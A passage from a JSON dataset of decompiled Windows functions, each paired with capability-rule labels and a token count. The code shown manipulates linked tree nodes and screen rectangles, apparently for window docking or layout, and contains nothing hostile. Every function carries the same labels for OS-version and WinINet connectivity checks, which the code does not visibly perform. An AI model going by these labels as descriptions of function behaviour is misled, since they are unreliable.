        "decompiled_code": "\nint32_t __fastcall fcn.0045a5f4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if ((in_EAX == *(*(in_EAX + 0x1c) + 100)) ||\n       (((iVar2 = in_EAX,  *(*(in_EAX + 0x1c) + 100) == *(in_EAX + 0x14) && (*(in_EAX + 4) != 0)) &&\n        (iVar1 = fcn.0045a484(),  iVar1 == 1)))) {\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n        if (param_2 == '\\x01') {\n            iVar2 = iStack20 - iStack28;\n        }\n        else {\n            iVar2 = iStack24 - iStack32;\n        }\n    }\n    else {\n        for (; iVar2 != *(*(in_EAX + 0x1c) + 100); iVar2 = *(iVar2 + 0x14)) {\n            if (param_2 == *(*(iVar2 + 0x14) + 0x10)) {\n                iVar2 = fcn.0045a9c8();\n                iVar1 = fcn.0045a4e0();\n                return iVar2 - iVar1;\n            }\n        }\n        if (param_2 == *(*(*(in_EAX + 0x1c) + 100) + 0x10)) {\n            iVar2 = *(*(in_EAX + 0x1c) + 0x68);\n        }\n        else {\n            iVar2 = fcn.0045a9c8();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 459
    },
    "0045a6ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0045a6ac(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0045a484();\n    if ((iVar1 != 0) && (*(in_EAX + 0x10) != '\\0')) {\n        iVar2 = fcn.0045aacc();\n        if (*(in_EAX + 0x10) == '\\x01') {\n            iVar1 = fcn.0045a5f4();\n        }\n        else if (*(in_EAX + 0x10) == '\\x02') {\n            iVar1 = fcn.0045a5f4();\n        }\n        else {\n            iVar1 = 0;\n        }\n        iVar3 = fcn.0045a484();\n        iVar1 = iVar1 / iVar3;\n        while (iVar2 != 0) {\n            if (*(iVar2 + 0xc) == 0) {\n                fcn.0045a9f0();\n            }\n            else {\n                fcn.0045a4e0();\n                fcn.0045a9f0();\n            }\n            fcn.0045a84c();\n            iVar1 = fcn.0045aaa4();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 301
    },
    "0045a754": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a754(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00405530();\n    if (*(in_EAX + 4) != 0) {\n        if (*(*(in_EAX + 4) + 8) == 0) {\n            fcn.0040dba8();\n            fcn.00404ec4();\n        }\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0045a798": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x0045a7cd)\n\nuint fcn.0045a798(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.0040484c();\n    return 0;\n}\n",
        "token_count": 80
    },
    "0045a84c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a84c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *arg_8h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    iVar2 = *(in_EAX + 4);\n    if (iVar2 == 0) {\n        return;\n    }\n    if (*(iVar2 + 0x57) == '\\0') {\n        return;\n    }\n    if (*(*(in_EAX + 0x1c) + 0x6c) != 0) {\n        return;\n    }\n    *(iVar2 + 0x90) = *(*(in_EAX + 0x14) + 0x10);\n    var_4h = in_EAX;\n    fcn.0045a5f4();\n    iVar2 = fcn.0045a5f4();\n    cVar1 = fcn.0045a81c(&stack0xfffffffc);\n    if ((cVar1 != '\\0') && (*(*(var_4h + 0x14) + 0x10) != '\\x01')) {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\n    iVar3 = fcn.0045aaa4();\n    if ((iVar3 == 0) &&\n       (((*(var_4h + 0x14) == *(*(var_4h + 0x1c) + 100) ||\n         (*(*(var_4h + 0x14) + 0x10) != *(*(*(var_4h + 0x1c) + 100) + 0x10))) ||\n        (iVar3 = fcn.0045a9c8(),  *(*(var_4h + 0x1c) + 0x68) <= iVar3)))) {\n        if (*(*(var_4h + 0x14) + 0x10) == *(*(*(var_4h + 0x1c) + 100) + 0x10)) goto code_r0x0045a975;\n        iVar3 = fcn.0045a9c8();\n        iVar4 = fcn.0045a9c8();\n        if (iVar4 <= iVar3) goto code_r0x0045a975;\n    }\n    if (*(*(var_4h + 0x14) + 0x10) == '\\x01') {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\ncode_r0x0045a975:\n    arg_8h = &var_14h;\n    uVar5 = fcn.0045a570();\n    fcn.0045a570(uVar5);\n    fcn.00418460(arg_8h, iVar2);\n    (****(var_4h + 0x1c))();\n    fcn.00450144();\n    return;\n}\n",
        "token_count": 685
    },
    "0045acc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045acc4(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(arg_8h + -4) == *(in_EAX + 4)) {\n        *(arg_8h + -8) = in_EAX;\n        return;\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 0xc) != 0)) {\n        fcn.0045acc4(arg_8h);\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 8) != 0)) {\n        fcn.0045acc4(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0045ad1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045ad1c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((param_2 != 0) && (*(in_EAX + 100) != 0)) {\n        fcn.0045acc4(&stack0xfffffffc);\n    }\n    return 0;\n}\n",
        "token_count": 94
    },
    "0045ae20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0045ae20(uint arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t in_CL;\n    uint8_t uVar4;\n    int32_t in_EDX;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (*(in_EDX + 0x57) != '\\0') {\n        var_1h._0_1_ = in_CL;\n        if (in_EAX[0xe] == 0) {\n            if (*(in_EAX[0x19] + 8) == 0) {\n                (**(*in_EAX[5] + 0x44))();\n                (**(*in_EAX[5] + 0x90))();\n                var_10h = var_14h - var_1ch;\n                if (*(in_EAX[5] + 0x5c) != '\\0') {\n                    if (var_18h == var_20h) {\n                        fcn.004507a4();\n                    }\n                    if (var_10h == 0) {\n                        var_10h = fcn.00450790();\n                    }\n                }\n                fcn.00418460(&var_30h, var_10h);\n                var_20h = var_30h;\n                var_1ch = iStack48;\n                var_18h = iStack44;\n                var_14h = iStack40;\n                (***in_EAX)();\n                fcn.00450144();\n                iVar1 = fcn.0045a44c();\n                iVar2 = in_EAX[0x19];\n                *(iVar2 + 8) = iVar1;\n                *(iVar1 + 0x14) = iVar2;\n                *(iVar1 + 4) = in_EDX;\n            }\n            else {\n                if ((in_CL == 0) || (in_CL == 5)) {\n                    var_1h._0_1_ = 4;\n                }\n                iVar2 = fcn.0045ad1c();\n                if (iVar2 != 0) {\n                    fcn.0045bf70();\n                }\n                var_8h = fcn.0045ad1c();\n                var_9h = *(var_1h + 0x490760);\n                iVar2 = fcn.0045a470();\n                if (iVar2 == 1) {\n                    *(in_EAX[0x19] + 0x10) = var_9h;\n                    if (var_9h == 1) {\n                        fcn.0045a5f4();\n                        fcn.0045a9f0();\n                        uVar3 = fcn.0045a5f4();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                    else if (var_9h == 2) {\n                        fcn.0045a5f4();\n                        fcn.0045a9f0();\n                        uVar3 = fcn.0045a5f4();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                }\n                iVar2 = fcn.0045a44c();\n                *(iVar2 + 4) = in_EDX;\n                if (var_8h == 0) {\n                    uVar4 = *(in_EAX[0x19] + 0x10);\n                }\n                else {\n                    uVar4 = *(*(var_8h + 0x14) + 0x10);\n                }\n                if (var_9h == 0) {\n                    var_9h = uVar4;\n                }\n                if (uVar4 == var_9h) {\n                    fcn.0045b1e4(*(var_1h + 0x490768));\n                }\n                else {\n                    fcn.0045b03c(*(var_1h + 0x490768), var_9h);\n                }\n            }\n        }\n        else {\n            *(in_EAX[0xe] + 4) = in_EDX;\n            fcn.0045a84c();\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1049
    },
    "0045b03c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b03c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar2 = fcn.0045a44c();\n    *(iVar2 + 0x10) = arg_ch;\n    if (in_ECX == 0) {\n        fcn.0045a9f0();\n        uVar3 = fcn.0045a9c8();\n        *(in_EAX + 0x68) = uVar3;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x40) = 0;\n        *(in_EAX + 0x44) = 0x3fe00000;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0x18) = in_EDX;\n            *(in_EDX + 0xc) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0045ad84(0x45c2f8);\n            uVar4 = fcn.0045a9c8();\n            iVar2 = uVar4 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((uVar4 & 1) != 0);\n            }\n            *(in_EAX + 0x4c) = iVar2;\n            fcn.0045ad84(0x45c748);\n            fcn.0045a9c8();\n            fcn.0045a9f0();\n        }\n        else {\n            *(iVar2 + 8) = *(in_EAX + 100);\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0045ad84(0x45c2f8);\n        }\n        fcn.0045ad84(0x45c880);\n    }\n    else {\n        fcn.0045a9c8();\n        fcn.0045a9f0();\n        *(iVar2 + 0x14) = *(in_ECX + 0x14);\n        iVar1 = *(in_ECX + 0x18);\n        *(iVar2 + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = iVar2;\n        }\n        iVar1 = *(in_ECX + 0xc);\n        *(iVar2 + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = iVar2;\n        }\n        if (in_ECX == *(*(iVar2 + 0x14) + 8)) {\n            *(*(iVar2 + 0x14) + 8) = iVar2;\n        }\n        *(in_EDX + 0x14) = iVar2;\n        *(in_ECX + 0x14) = iVar2;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            *(in_ECX + 0x18) = in_EDX;\n            *(in_ECX + 0xc) = 0;\n            *(in_EDX + 0xc) = in_ECX;\n        }\n        else {\n            *(iVar2 + 8) = in_ECX;\n            *(in_ECX + 0x18) = 0;\n            *(in_ECX + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = in_ECX;\n        }\n    }\n    fcn.0045a6ac();\n    fcn.0045aa44();\n    fcn.0045ad84(0x45c880);\n    return;\n}\n",
        "token_count": 989
    },
    "0045b25c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0045b25c(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar1 = fcn.0045a570();\n    iVar2 = fcn.0045a570();\n    if (*(in_EAX + 0x1c) == '\\0') {\n        if (((iVar2 <= *in_ECX) && (*in_ECX <= *(in_EAX + 0x18) + iVar2)) && (iVar1 <= in_ECX[1])) {\n            iVar2 = fcn.0045a5f4();\n            if (in_ECX[1] <= iVar1 + iVar2) {\n                var_5h = 1;\n                if (in_ECX[1] < *(*(in_EDX + 4) + 0x44) + 0xf) {\n                    *arg_8h = 0x14;\n                }\n                else {\n                    *arg_8h = 2;\n                }\n            }\n        }\n    }\n    else if (((iVar1 <= in_ECX[1]) && (in_ECX[1] <= iVar1 + *(in_EAX + 0x18))) && (iVar2 <= *in_ECX)) {\n        iVar1 = fcn.0045a5f4();\n        if (*in_ECX <= iVar1 + iVar2) {\n            var_5h = 1;\n            if (*(*(in_EDX + 4) + 0x40) + *(*(in_EDX + 4) + 0x48) + -0xf < *in_ECX) {\n                *arg_8h = 0x14;\n            }\n            else {\n                *arg_8h = 2;\n            }\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 447
    },
    "0045b360": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0045b360(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uchar *puStack40;\n    uint uStack36;\n    uchar auStack20 [4];\n    \n    iVar2 = fcn.00454658();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            piVar3 = fcn.0045461c();\n            if ((*(piVar3 + 0x57) != '\\0') && ((cVar1 = fcn.004047dc(),  cVar1 == '\\0' || (*(piVar3 + 0x1da) != '\\0'))))\n            {\n                fcn.00418410();\n                (**(*piVar3 + 0x44))(puStack40, uStack36);\n                puStack40 = auStack20;\n                iVar4 = sub.user32.dll_PtInRect();\n                if (iVar4 != 0) {\n                    return piVar3;\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return NULL;\n}\n",
        "token_count": 266
    },
    "0045b3ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b3ec(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.0045a9c8();\n        if (*(*(arg_8h + -4) + 4) <= iVar2) {\n            iVar2 = fcn.0045a9c8();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= *(*(arg_8h + -4) + 4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045b4af;\n            }\n        }\n    }\n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x02') {\n        iVar2 = fcn.0045a9c8();\n        if (**(arg_8h + -4) <= iVar2) {\n            iVar2 = fcn.0045a9c8();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= **(arg_8h + -4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045b4af;\n            }\n        }\n    }\n    if (*(in_EAX + 4) != 0) {\n        cVar1 = (**(**(arg_8h + -8) + 0x40))(*(arg_8h + -0xc));\n        if (cVar1 != '\\0') {\n            *(arg_8h + -0x10) = in_EAX;\n        }\n    }\ncode_r0x0045b4af:\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.0045aaa4();\n        if (iVar2 != 0) {\n            iVar2 = arg_8h;\n            fcn.0045aaa4();\n            fcn.0045b3ec(iVar2);\n        }\n    }\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.0045aacc();\n        if (iVar2 != 0) {\n            fcn.0045aacc();\n            fcn.0045b3ec(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 598
    },
    "0045b500": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045b500(uint *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    var_10h = 0;\n    *param_1 = 0;\n    iVar1 = fcn.0045b360();\n    if ((iVar1 == 0) || (*(in_EAX + 0x14) != *(iVar1 + 0x94))) {\n        iVar2 = fcn.0045aacc();\n        if ((iVar2 != 0) && (iVar1 == 0)) {\n            fcn.0045aacc();\n            fcn.0045b3ec(arg_8h);\n        }\n    }\n    else {\n        var_10h = fcn.0045ad1c();\n        if (var_10h != 0) {\n            *param_1 = 1;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 260
    },
    "0045b588": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b588(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.00405530();\n    (**(**(arg_8h + -4) + 0xc))();\n    if (0 < in_ECX) {\n        fcn.00405c6c();\n        (**(**(arg_8h + -4) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0045b5d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045b5d0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint uVar6;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uchar var_26h;\n    int32_t var_25h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack92 = 0x45b913;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack96;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.0045bed4();\n    var_25h._0_1_ = *(var_ch + 0x1d);\n    fcn.0045acac();\n    uVar6 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    (**(*var_4h + 0xc))();\n    if (var_1ch == 0x40000) {\n        *(var_ch + 0x1d) = 0;\n        var_26h = 0;\n    }\n    else if (var_ch[0x1c] == var_1ch) {\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n    }\n    else {\n        var_40h = var_ch[0x1c];\n        var_3ch._0_1_ = 0;\n        var_38h = var_1ch;\n        var_34h._0_1_ = 0;\n        arg_ch = &var_40h;\n        uVar4 = 1;\n        fcn.00407550();\n        fcn.0040db28(uVar4, arg_ch);\n        fcn.00404ec4();\n    }\n    (**(*var_4h + 0xc))();\n    if (-1 < var_20h + -1) {\n        var_30h = var_20h;\n        var_1ch = 0;\n        do {\n            fcn.0045b588(&stack0xfffffffc);\n            if (var_8h != 0) {\n                fcn.0040484c();\n                if (var_10h != 0) {\n                    fcn.00450724();\n                    uVar6 = 0;\n                    fcn.00451604(0);\n                }\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    (**(*var_4h + 0xc))();\n    if (*(var_ch + 0x1d) != '\\0') {\n        (**(*var_ch + 0x28))();\n        iVar2 = fcn.0045cfc4();\n        var_ch[0x1a] = iVar2;\n    }\n    var_18h = 0;\n    iVar2 = 0;\ncode_r0x0045b76e:\n    do {\n        (**(*var_4h + 0xc))();\n        if (var_14h == *0x490770) {\n            *in_FS_OFFSET = uVar6;\n            *(var_ch + 0x1d) = var_25h;\n            if (var_ch[0x19] == 0) {\n                iVar2 = fcn.0045a44c();\n                var_ch[0x19] = iVar2;\n            }\n            fcn.0045acb0();\n            return;\n        }\n        iVar3 = fcn.0045a44c();\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n        if (*(var_ch + 0x1d) != '\\0') {\n            (**(*var_ch + 0x28))();\n            uVar4 = fcn.0045cfc4();\n            *(iVar3 + 0x20) = uVar4;\n        }\n        fcn.0045b588(&stack0xfffffffc);\n        if (var_8h != 0) {\n            cVar1 = fcn.0045a798();\n            if (cVar1 == '\\0') {\n                fcn.00404650();\n                goto code_r0x0045b76e;\n            }\n        }\n        if (var_14h == 0) {\n            var_ch[0x19] = iVar3;\n        }\n        else if (var_14h == var_18h) {\n            iVar5 = iVar2;\n            if ((*(iVar2 + 0x18) != 0) && (*(iVar2 + 4) == 0)) {\n                iVar5 = *(iVar2 + 0x18);\n                var_2ch = iVar2;\n                fcn.00404650();\n            }\n            *(iVar5 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = iVar5;\n            *(iVar3 + 0x14) = *(iVar5 + 0x14);\n        }\n        else if (var_18h < var_14h) {\n            *(iVar2 + 8) = iVar3;\n            *(iVar3 + 0x14) = iVar2;\n        }\n        else if (var_14h < var_18h) {\n            unique0x10000202 = iVar2;\n            if (0 < var_18h - var_14h) {\n                var_1ch = 1;\n                var_30h = var_18h - var_14h;\n                do {\n                    unique0x00007a00 = *(stack0xffffffd8 + 0x14);\n                    var_1ch = var_1ch + 1;\n                    var_30h = var_30h + -1;\n                } while (var_30h != 0);\n            }\n            *(stack0xffffffd8 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = stack0xffffffd8;\n            *(iVar3 + 0x14) = *(stack0xffffffd8 + 0x14);\n        }\n        var_18h = var_14h;\n        iVar2 = iVar3;\n    } while( true );\n}\n",
        "token_count": 1573
    },
    "0045bbf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045bbf0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x45bc09;\n    var_4h = fcn.00425088();\n    uStack52 = 0x45bd14;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x45bc25;\n    puStack48 = &stack0xfffffffc;\n    fcn.0044f0b0();\n    puStack60 = 0x45bc2d;\n    fcn.00425350();\n    uStack64 = 0x45bcf7;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x45bc45;\n    puStack60 = &stack0xfffffffc;\n    fcn.0042571c();\n    uStack76 = 0x45bcda;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar1 = fcn.00454658();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_ch = iVar1;\n        do {\n            iVar1 = fcn.0045461c();\n            if ((*(iVar1 + 0x57) != '\\0') && (*(iVar1 + 0x94) == in_EAX[5])) {\n                fcn.00450124();\n                (***in_EAX)();\n                (**(*in_EAX + 4))();\n                (**(*in_EAX + 0x20))(&fcn.0045bbf0::var_1ch);\n            }\n            var_8h = var_8h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x45bce1;\n    uStack76 = 0x45bcd9;\n    fcn.0042571c();\n    return;\n}\n",
        "token_count": 578
    },
    "0045bd24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bd24(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t var_1ch;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.00456fb0();\n    if (((in_ECX == 0) || (*(in_ECX + 0x90) == '\\0')) || (iVar2 < 2)) {\n        uVar3 = fcn.004501c4();\n        arg_8h_00 = &var_1ch;\n        fcn.00450180();\n        fcn.00418438(arg_8h_00, uVar3);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n        if (0 < iVar2) {\n            if (arg_ch == '\\x01') {\n                arg_8h[3] = arg_8h[3] / 2;\n            }\n            else if (arg_ch == '\\x02') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[1] = iVar2;\n            }\n            else if (arg_ch == '\\x03') {\n                arg_8h[2] = arg_8h[2] / 2;\n            }\n            else if (arg_ch == '\\x04') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + 